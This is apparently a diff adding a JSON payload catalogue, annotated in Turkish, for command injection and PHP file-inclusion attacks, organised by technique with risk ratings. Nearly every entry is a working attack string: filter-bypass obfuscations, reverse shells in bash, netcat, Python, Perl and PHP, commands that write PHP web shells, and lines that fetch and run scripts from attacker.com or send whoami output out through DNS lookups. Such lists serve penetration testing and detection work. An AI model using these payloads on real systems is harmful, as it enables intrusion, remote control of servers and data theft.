@@ -1,0 +1,646 @@
+{
+  "whitespace_bypass": {
+    "desc": "Komutlar arasındaki boşluk karakterlerini bypass etme",
+    "category": "Command Injection",
+    "type": "Whitespace Bypass",
+    "normal_command": "ls /etc/passwd",
+    "filtered_command": "ls/etc/passwd",
+    "bypass_method": "${IFS} kullanımı",
+    "example": "ls${IFS}/etc/passwd",
+    "purpose": "Boşluk filtrelerini aşma",
+    "risk": "High"
+  },
+  "single_quote_bypass": {
+    "desc": "Tek tırnak kullanarak komut filtrelerini aşma",
+    "category": "Command Injection", 
+    "type": "Quote Bypass",
+    "normal_command": "whoami",
+    "bypass_method": "Tek tırnak ile karakterleri ayırma",
+    "example": "w'h'o'am'i",
+    "purpose": "Kelime filtrelerini aşma",
+    "risk": "Medium"
+  },
+  "double_quote_bypass": {
+    "desc": "Çift tırnak kullanarak komut filtrelerini aşma",
+    "category": "Command Injection",
+    "type": "Quote Bypass", 
+    "normal_command": "whoami",
+    "bypass_method": "Çift tırnak ile karakterleri ayırma",
+    "example": "w\"h\"o\"am\"i",
+    "purpose": "Kelime filtrelerini aşma",
+    "risk": "Medium"
+  },
+  "backtick_bypass": {
+    "desc": "Backtick kullanarak komut filtrelerini aşma",
+    "category": "Command Injection",
+    "type": "Quote Bypass",
+    "normal_command": "whoami", 
+    "bypass_method": "Backticks ile karakterleri ayırma",
+    "example": "wh``oami",
+    "purpose": "Kelime filtrelerini aşma",
+    "risk": "Medium"
+  },
+  "dollar_parentheses_bypass": {
+    "desc": "$() kullanarak alt komut çalıştırma",
+    "category": "Command Injection",
+    "type": "Subcommand Execution",
+    "normal_command": "whoami",
+    "bypass_method": "$() ile alt komut enjeksiyonu",
+    "example": "who$()ami",
+    "purpose": "Alt komut enjeksiyonu",
+    "risk": "High"
+  },
+  "backtick_subcommand": {
+    "desc": "Backtick ile alt komut çalıştırma",
+    "category": "Command Injection",
+    "type": "Subcommand Execution", 
+    "normal_command": "whoami",
+    "bypass_method": "Backtick ile alt komut çalıştırma",
+    "example": "who`echo am`i",
+    "purpose": "Alt komut enjeksiyonu ile bypass",
+    "risk": "High"
+  },
+  "semicolon_separator": {
+    "desc": "Noktalı virgül ile komut ayırma",
+    "category": "Command Injection",
+    "type": "Command Separator",
+    "syntax": "command1; command2",
+    "purpose": "Birden fazla komut çalıştırma",
+    "risk": "High"
+  },
+  "logical_or_bypass": {
+    "desc": "Mantıksal OR operatörü ile komut çalıştırma",
+    "category": "Command Injection", 
+    "type": "Logical Operator",
+    "syntax": "command1 || command2",
+    "example": "-6||sleep${IFS}10",
+    "purpose": "Koşullu komut çalıştırma",
+    "risk": "High"
+  },
+  "sleep_injection": {
+    "desc": "Sleep komutu ile time-based injection",
+    "category": "Command Injection",
+    "type": "Time Based",
+    "example": "-6||sleep${IFS}10", 
+    "purpose": "Zaman tabanlı komut enjeksiyonu tespiti",
+    "risk": "Medium"
+  },
+  "php_filter_lfi": {
+    "desc": "PHP filtreleri ile Local File Inclusion",
+    "category": "Local File Inclusion",
+    "type": "PHP Filter",
+    "syntax": "php://filter/convert.base64-encode/resource=file",
+    "example": "php://filter/convert.base64-encode/resource=config.php",
+    "purpose": "PHP dosyalarını base64 ile okuma",
+    "risk": "High"
+  },
+  "php_filter_variations": {
+    "desc": "PHP filter çeşitleri ve kullanım şekilleri",
+    "category": "Local File Inclusion",
+    "type": "PHP Filter Variations",
+    "examples": [
+      "php://filter/read=convert.base64-encode/resource=config.php",
+      "php://filter/convert.base64-decode/resource=data.txt",
+      "php://filter/string.rot13/resource=config.php",
+      "php://filter/zlib.deflate/resource=config.php"
+    ],
+    "purpose": "Farklı encoding/decoding teknikleri",
+    "risk": "High"
+  },
+  "php_input_stream": {
+    "desc": "PHP input stream ile kod enjeksiyonu",
+    "category": "Code Injection",
+    "type": "PHP Stream",
+    "syntax": "php://input",
+    "purpose": "POST verisi üzerinden PHP kodu çalıştırma",
+    "risk": "Critical"
+  },
+  "data_wrapper": {
+    "desc": "PHP data wrapper ile kod enjeksiyonu",
+    "category": "Code Injection", 
+    "type": "PHP Wrapper",
+    "syntax": "data://text/plain;base64,encoded_payload",
+    "example": "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
+    "purpose": "Base64 encoded PHP kodu çalıştırma",
+    "risk": "Critical"
+  },
+  "advanced_whitespace_bypass": {
+    "desc": "Gelişmiş boşluk karakteri bypass teknikleri",
+    "category": "Command Injection",
+    "type": "Advanced Whitespace Bypass",
+    "examples": [
+      "${IFS}",
+      "${IFS//?/}",
+      "$IFS$9",
+      "$IFS$4",
+      "${LS_COLORS//?/}",
+      "$*",
+      "$@",
+      "{cat,/etc/passwd}",
+      "{cat%20/etc/passwd}",
+      "{cat${IFS}/etc/passwd}"
+    ],
+    "purpose": "Farklı boşluk karakteri varyasyonları",
+    "risk": "High",
+    "reference": "PayloadsAllTheThings"
+  },
+  "hex_encoding_bypass": {
+    "desc": "Hexadecimal encoding ile bypass",
+    "category": "Command Injection",
+    "type": "Encoding Bypass",
+    "examples": [
+      "$(echo -e '\\x77\\x68\\x6f\\x61\\x6d\\x69')",
+      "`echo -e '\\x77\\x68\\x6f\\x61\\x6d\\x69'`",
+      "echo -e '\\x77\\x68\\x6f\\x61\\x6d\\x69' | sh",
+      "\\x77\\x68\\x6f\\x61\\x6d\\x69"
+    ],
+    "purpose": "ASCII karakterlerin hex karşılıklarını kullanma",
+    "risk": "High",
+    "reference": "HackTricks"
+  },
+  "octal_encoding_bypass": {
+    "desc": "Octal encoding ile bypass",
+    "category": "Command Injection",
+    "type": "Encoding Bypass",
+    "examples": [
+      "$(echo -e '\\167\\150\\157\\141\\155\\151')",
+      "`echo -e '\\167\\150\\157\\141\\155\\151'`",
+      "echo -e '\\167\\150\\157\\141\\155\\151' | sh"
+    ],
+    "purpose": "ASCII karakterlerin octal karşılıklarını kullanma",
+    "risk": "High",
+    "reference": "PayloadsAllTheThings"
+  },
+  "nested_command_bypass": {
+    "desc": "İç içe komutlarla bypass",
+    "category": "Command Injection",
+    "type": "Nested Command Bypass",
+    "examples": [
+      "$(cat /etc/passwd | base64)",
+      "$(whoami | rev)",
+      "`whoami | rev | rev`",
+      "$(echo $(whoami))",
+      "$(echo $(echo $(whoami)))",
+      "`$(whoami)`",
+      "$(`whoami`)",
+      "$(sh -c 'whoami')"
+    ],
+    "purpose": "İç içe komut çalıştırma ile filtre bypass",
+    "risk": "High",
+    "reference": "HackTricks"
+  },
+  "base64_encoded_commands": {
+    "desc": "Base64 ile encode edilmiş komutlar",
+    "category": "Command Injection",
+    "type": "Base64 Encoding",
+    "examples": [
+      "echo 'd2hvYW1p' | base64 -d | sh",
+      "echo 'd2hvYW1pCg==' | base64 -d | bash",
+      "sh -c $(echo 'd2hvYW1p' | base64 -d)",
+      "bash -c $(echo 'd2hvYW1p' | base64 -d)",
+      "eval $(echo 'd2hvYW1p' | base64 -d)"
+    ],
+    "purpose": "Base64 encode ile komut filtreleme bypass",
+    "risk": "High",
+    "reference": "PayloadsAllTheThings"
+  },
+  "environment_variable_bypass": {
+    "desc": "Environment değişkenleriyle bypass",
+    "category": "Command Injection",
+    "type": "Environment Variable Bypass",
+    "examples": [
+      "$0 -c 'whoami'",
+      "$SHELL -c 'whoami'",
+      "${SHELL} -c 'whoami'",
+      "${PATH:0:1}bin${PATH:0:1}sh -c 'whoami'",
+      "${PATH:0:1}etc${PATH:0:1}passwd",
+      "${USER:0:1}whoami",
+      "PATH=/bin:/usr/bin:/usr/local/bin",
+      "VAR=command; $VAR"
+    ],
+    "purpose": "Environment değişkenlerini kullanarak bypass",
+    "risk": "High",
+    "reference": "HackTricks"
+  },
+  "path_manipulation_bypass": {
+    "desc": "Path manipulation ile bypass",
+    "category": "Command Injection",
+    "type": "Path Manipulation",
+    "examples": [
+      "/???/??t /???/??sswd",
+      "/[b-a]in/[b-a]ash",
+      "/%2fbin%2fsh",
+      "/%2e%2e/%2e%2e/%2fbin%2fsh",
+      "....//....//bin/sh",
+      "/bin/\\x2e\\x2e/\\x2e\\x2e/\\x2e\\x2e/\\x2e\\x2e/bin/sh",
+      "/b\\u0069n/\\u0073h",
+      "/$(printf '\\x2f')bin$(printf '\\x2f')sh"
+    ],
+    "purpose": "Path karakterlerini değiştirerek bypass",
+    "risk": "High",
+    "reference": "PayloadsAllTheThings"
+  },
+  "bash_interpreter_bypass": {
+    "desc": "Farklı bash interpreter'larla bypass",
+    "category": "Command Injection",
+    "type": "Bash Interpreter Bypass",
+    "examples": [
+      "bash -c 'whoami'",
+      "sh -c 'whoami'",
+      "ash -c 'whoami'",
+      "zsh -c 'whoami'",
+      "ksh -c 'whoami'",
+      "bash -i >& /dev/tcp/IP/PORT 0>&1",
+      "sh -i >& /dev/tcp/IP/PORT 0>&1",
+      "0<&196;exec 196<>/dev/tcp/IP/PORT; sh <&196 >&196 2>&196"
+    ],
+    "purpose": "Farklı shell interpreter'lar kullanma",
+    "risk": "Critical",
+    "reference": "HackTricks"
+  },
+  "powershell_bypass": {
+    "desc": "PowerShell command injection bypass teknikleri",
+    "category": "Command Injection",
+    "type": "PowerShell Bypass",
+    "examples": [
+      "powershell -encodedcommand dwBoAG8AYQBtAGkA",
+      "powershell -Command \"Get-Process\"",
+      "powershell -c \"whoami\"",
+      "cmd /c powershell -w hidden -ep bypass -enc dwBoAG8AYQBtAGkA",
+      "cmd /c powershell -WindowStyle Hidden -Exec Bypass -Command \"whoami\"",
+      "Get-Command w`h`o`a`m`i",
+      "Invoke-Expression $(Get-Content -Path 'command.txt')"
+    ],
+    "purpose": "PowerShell için bypass teknikleri",
+    "risk": "High",
+    "platform": "Windows",
+    "reference": "HackTricks"
+  },
+  "cmd_bypass_windows": {
+    "desc": "Windows CMD bypass teknikleri",
+    "category": "Command Injection",
+    "type": "CMD Bypass",
+    "examples": [
+      "cmd /c who^ami",
+      "cmd /c who\"\"ami",
+      "cmd /c who%random%ami",
+      "cmd /v:on /c \"set cmd=whoami && !cmd!\"",
+      "for /f %i in ('whoami') do @echo %i",
+      "certutil -urlcache -split -f http://attacker.com/cmd.txt && cmd.txt",
+      "echo whoami > temp.bat && temp.bat",
+      "type nul > temp.bat && echo whoami >> temp.bat && temp.bat"
+    ],
+    "purpose": "Windows CMD filter bypass",
+    "risk": "High",
+    "platform": "Windows",
+    "reference": "PayloadsAllTheThings"
+  },
+  "unicode_normalization_bypass": {
+    "desc": "Unicode normalization ile bypass - farklı Unicode karakterler",
+    "category": "Command Injection",
+    "type": "Unicode Bypass",
+    "examples": [
+      "wh\u043eami",
+      "wh\u00f6ami",
+      "\u0077\u0068\u006f\u0061\u006d\u0069",
+      "/\u0065tc/\u0070asswd",
+      "/\uff45tc/\uff50asswd",
+      "c\u0061t /etc/passwd",
+      "/b\u0131n/sh",
+      "c\u0430t /etc/passwd"
+    ],
+    "purpose": "Unicode karakterlerle filter bypass (homoglyph attack)",
+    "risk": "High",
+    "note": "Bazı karakterler visually aynı ama farklı Unicode codepoint'e sahip",
+    "reference": "OWASP"
+  },
+  "unicode_rtl_override": {
+    "desc": "Unicode Right-to-Left Override ile bypass",
+    "category": "Command Injection",
+    "type": "Unicode RTL",
+    "examples": [
+      "wh\u202eimaou",
+      "cat\u202e/dnf/ssapte/cte/",
+      "/bin\u202ehs/nib/"
+    ],
+    "purpose": "RTL override ile komutları gizleme",
+    "risk": "Medium",
+    "note": "U+202E karakteri sonrasındaki metni ters çevirir",
+    "reference": "Trojan Source Attack"
+  },
+  "brace_expansion_bypass": {
+    "desc": "Bash brace expansion ile bypass",
+    "category": "Command Injection",
+    "type": "Brace Expansion",
+    "examples": [
+      "{cat,/etc/passwd}",
+      "{cat,/etc,passwd}",
+      "{ls,-la,/}",
+      "{wget,-O-,http://attacker.com/shell.sh}|{bash,-i}",
+      "{curl,http://attacker.com/shell.sh}|{sh,-i}",
+      "/???/c?t /???/p?ss??",
+      "/???/{c,s}?t /???/p?ss??",
+      "{/bin/cat,/etc/passwd}",
+      "{,/usr,/bin,/ls}",
+      "{base64,-d}<<<ZWNobyBoYWNrZWQ="
+    ],
+    "purpose": "Brace expansion ile boşluk ve filtre bypass",
+    "risk": "High",
+    "reference": "PayloadsAllTheThings"
+  },
+  "wildcard_injection": {
+    "desc": "Wildcard injection ile bypass",
+    "category": "Command Injection",
+    "type": "Wildcard Bypass",
+    "examples": [
+      "/???/??t /???/??sswd",
+      "/b??/c?t /e??/p???w?",
+      "/*/cat /*/passwd",
+      "/usr/*/cat /etc/passwd",
+      "c[a]t /etc/passwd",
+      "c[a-z]t /etc/passwd",
+      "/bin/[b-z]ash",
+      "who[a]mi",
+      "w*ami",
+      "w?oami"
+    ],
+    "purpose": "Wildcard karakterlerle komut obfuscation",
+    "risk": "High",
+    "reference": "HackTricks"
+  },
+  "newline_injection": {
+    "desc": "Newline karakteri ile bypass",
+    "category": "Command Injection",
+    "type": "Newline Bypass",
+    "examples": [
+      "%0a whoami",
+      "%0d%0a whoami",
+      "\\n whoami",
+      "\\r\\n whoami",
+      "$(printf '\\n')whoami",
+      "test%0awhoami",
+      "test\\nwhoami",
+      "test\nwhoami"
+    ],
+    "purpose": "Newline ile komut ayırma",
+    "risk": "High",
+    "reference": "OWASP"
+  },
+  "null_byte_injection": {
+    "desc": "Null byte injection (language dependent)",
+    "category": "Command Injection",
+    "type": "Null Byte",
+    "examples": [
+      "whoami%00",
+      "cat /etc/passwd%00.jpg",
+      "whoami\\x00",
+      "cat /etc/passwd\\0",
+      "test%00;whoami"
+    ],
+    "purpose": "Null byte ile string truncation",
+    "risk": "Medium",
+    "note": "PHP < 5.3.4, Python 2.x gibi eski sistemlerde çalışır",
+    "reference": "OWASP"
+  },
+  "tab_character_bypass": {
+    "desc": "Tab karakteri ile bypass",
+    "category": "Command Injection",
+    "type": "Tab Bypass",
+    "examples": [
+      "cat\\t/etc/passwd",
+      "cat%09/etc/passwd",
+      "ls\\t-la",
+      "whoami%09%09",
+      "cat${IFS%??}/etc/passwd"
+    ],
+    "purpose": "Tab karakteri ile boşluk bypass",
+    "risk": "Medium"
+  },
+  "variable_indirection": {
+    "desc": "Bash variable indirection ile bypass",
+    "category": "Command Injection",
+    "type": "Variable Indirection",
+    "examples": [
+      "a=w;b=hoami;$a$b",
+      "cmd=whoami;$cmd",
+      "c=c;a=a;t=t;$c$a$t /etc/passwd",
+      "x='who';y='ami';eval $x$y",
+      "cmd='cat /etc/passwd';eval $cmd",
+      "w='w';h='h';o='o';a='a';m='m';i='i';$w$h$o$a$m$i",
+      "eval \"wh\"'o''am'\"i\""
+    ],
+    "purpose": "Variable kullanarak komut obfuscation",
+    "risk": "High",
+    "reference": "HackTricks"
+  },
+  "reverse_shell_obfuscation": {
+    "desc": "Reverse shell obfuscation teknikleri",
+    "category": "Command Injection",
+    "type": "Reverse Shell",
+    "examples": [
+      "bash -c 'exec 5<>/dev/tcp/IP/PORT;cat <&5 | while read line; do $line 2>&5 >&5; done'",
+      "0<&196;exec 196<>/dev/tcp/IP/PORT; sh <&196 >&196 2>&196",
+      "bash -i >& /dev/tcp/IP/PORT 0>&1",
+      "sh -i >& /dev/udp/IP/PORT 0>&1",
+      "nc -e /bin/sh IP PORT",
+      "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f",
+      "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"IP\",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
+      "perl -e 'use Socket;$i=\"IP\";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
+      "php -r '$sock=fsockopen(\"IP\",PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+    ],
+    "purpose": "Reverse shell oluşturma",
+    "risk": "Critical",
+    "reference": "PentestMonkey"
+  },
+  "reverse_shell_encoded": {
+    "desc": "Encoded reverse shell payloads",
+    "category": "Command Injection",
+    "type": "Encoded Reverse Shell",
+    "examples": [
+      "echo YmFzaCAtaSA+JiAvZGV2L3RjcC9JUC9QT1JUIDI+JjE= | base64 -d | bash",
+      "echo cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0... | base64 -d | python",
+      "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xLzQ0NDQgMj4mMQ==}|{base64,-d}|{bash,-i}"
+    ],
+    "purpose": "Base64 encode ile reverse shell gizleme",
+    "risk": "Critical",
+    "reference": "HackTricks"
+  },
+  "time_based_blind_injection": {
+    "desc": "Time-based blind command injection",
+    "category": "Command Injection",
+    "type": "Blind Injection",
+    "examples": [
+      "|| sleep 10",
+      "& sleep 10 &",
+      "; sleep 10",
+      "$(sleep 10)",
+      "`sleep 10`",
+      "| sleep 10",
+      "|| ping -c 10 127.0.0.1",
+      "& timeout 10 &",
+      "; start /wait timeout 10",
+      "| Start-Sleep -s 10"
+    ],
+    "purpose": "Blind command injection tespiti",
+    "risk": "High",
+    "note": "Cevap görünmüyorsa zaman gecikmesi ile tespit et",
+    "reference": "PortSwigger"
+  },
+  "dns_based_blind_injection": {
+    "desc": "DNS-based out-of-band command injection",
+    "category": "Command Injection",
+    "type": "OOB Injection",
+    "examples": [
+      "|| nslookup attacker.com",
+      "& nslookup $(whoami).attacker.com &",
+      "; dig $(whoami).attacker.com",
+      "| host $(whoami).attacker.com",
+      "|| curl http://$(whoami).attacker.com",
+      "& wget http://$(hostname).attacker.com &",
+      "| ping -c 1 $(id|base64).attacker.com"
+    ],
+    "purpose": "DNS ile out-of-band veri çalma",
+    "risk": "High",
+    "tools": ["Burp Collaborator", "Interactsh", "DNSBin"],
+    "reference": "PortSwigger"
+  },
+  "file_write_techniques": {
+    "desc": "Command injection ile dosya yazma",
+    "category": "Command Injection",
+    "type": "File Write",
+    "examples": [
+      "echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/shell.php",
+      "cat > /tmp/shell.sh <<EOF\\n#!/bin/bash\\nwhoami\\nEOF",
+      "printf '<?php eval($_POST[1]); ?>' > shell.php",
+      "tee /var/www/html/shell.php <<<'<?php system($_GET[0]); ?>'",
+      "wget http://attacker.com/shell.php -O /var/www/html/shell.php",
+      "curl http://attacker.com/shell.php -o /tmp/shell.php",
+      "base64 -d <<<PD9waHAgc3lzdGVtKCRfR0VUWzBdKTsgPz4= > shell.php"
+    ],
+    "purpose": "Webshell veya backdoor oluşturma",
+    "risk": "Critical",
+    "reference": "HackTricks"
+  },
+  "command_substitution_advanced": {
+    "desc": "Advanced command substitution",
+    "category": "Command Injection",
+    "type": "Command Substitution",
+    "examples": [
+      "$(</etc/passwd)",
+      "$(<$(</tmp/file))",
+      "$(<<< $(whoami))",
+      "`< /etc/passwd`",
+      "cat $(find / -name passwd 2>/dev/null|head -1)",
+      "cat $(locate passwd|head -1)",
+      "echo $(printf '\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64')",
+      "eval \"\\$(cat /etc/passwd)\""
+    ],
+    "purpose": "Advanced command substitution ile bypass",
+    "risk": "High",
+    "reference": "PayloadsAllTheThings"
+  },
+  "polyglot_command_injection": {
+    "desc": "Polyglot command injection - multi-context",
+    "category": "Command Injection",
+    "type": "Polyglot",
+    "examples": [
+      "';whoami;'",
+      "\";whoami;\"",
+      "`;whoami;`",
+      "');whoami;('",
+      "\");whoami;(\"",
+      "|whoami|",
+      "&whoami&",
+      "||whoami||",
+      "&&whoami&&",
+      "\\n\\rwhoami\\n\\r",
+      "%0a%0dwhoami%0a%0d"
+    ],
+    "purpose": "Farklı context'lerde çalışan payloadlar",
+    "risk": "High",
+    "reference": "PortSwigger"
+  },
+  "case_manipulation_bypass": {
+    "desc": "Case manipulation ile bypass",
+    "category": "Command Injection",
+    "type": "Case Bypass",
+    "examples": [
+      "WhOaMi",
+      "CaT /etc/passwd",
+      "cAt /EtC/pAsSwD",
+      "/BiN/sH",
+      "LsOf -i",
+      "$(tr '[:lower:]' '[:upper:]' <<< whoami)"
+    ],
+    "purpose": "Case-insensitive filtreleri bypass etme",
+    "risk": "Low",
+    "note": "Linux case-sensitive olduğu için genelde çalışmaz, ama bazı parser'lar için işe yarayabilir"
+  },
+  "line_continuation_bypass": {
+    "desc": "Line continuation ile bypass",
+    "category": "Command Injection",
+    "type": "Line Continuation",
+    "examples": [
+      "who\\\\\\nami",
+      "cat\\\\ /etc/passwd",
+      "ls \\\\ -la",
+      "wh\\\\\\r\\nami",
+      "cat /e\\\\\\ntc/passwd"
+    ],
+    "purpose": "Backslash ile satır devam ettirme",
+    "risk": "Medium",
+    "reference": "Bash Manual"
+  },
+  "process_substitution": {
+    "desc": "Bash process substitution",
+    "category": "Command Injection",
+    "type": "Process Substitution",
+    "examples": [
+      "cat <(ls -la)",
+      "diff <(ls /tmp) <(ls /var)",
+      "while read line; do echo $line; done < <(ps aux)",
+      "cat <(curl http://attacker.com/shell.sh) | bash",
+      "source <(curl -s http://attacker.com/script.sh)"
+    ],
+    "purpose": "Process substitution ile komut çalıştırma",
+    "risk": "High",
+    "reference": "Advanced Bash Scripting"
+  },
+  "glob_pattern_abuse": {
+    "desc": "Glob pattern abuse",
+    "category": "Command Injection",
+    "type": "Glob Abuse",
+    "examples": [
+      "echo *",
+      "cat /*",
+      "cat /etc/*",
+      "cat /etc/p*",
+      "cat /etc/p[a-z]*",
+      "/???/[a-z][a-z]t /???/p?ss??",
+      "for i in /*;do cat $i;done"
+    ],
+    "purpose": "Glob expansion ile dosya okuma",
+    "risk": "Medium"
+  },
+  "alternative_execution_methods": {
+    "desc": "Alternative command execution methods",
+    "category": "Command Injection",
+    "type": "Alternative Execution",
+    "examples": [
+      "perl -e 'system(\"whoami\")'",
+      "python -c \"import os;os.system('whoami')\"",
+      "python3 -c \"__import__('os').system('whoami')\"",
+      "ruby -e 'system(\"whoami\")'",
+      "php -r \"system('whoami');\"",
+      "node -e \"require('child_process').exec('whoami')\"",
+      "lua -e \"os.execute('whoami')\"",
+      "awk 'BEGIN {system(\"whoami\")}'",
+      "find / -name passwd -exec cat {} \\;",
+      "vi -c ':!whoami' -c ':q'",
+      "vim -c ':!whoami' -c ':q'"
+    ],
+    "purpose": "Farklı interpreter'larla komut çalıştırma",
+    "risk": "Critical",
+    "reference": "GTFOBins"
+  }
+}
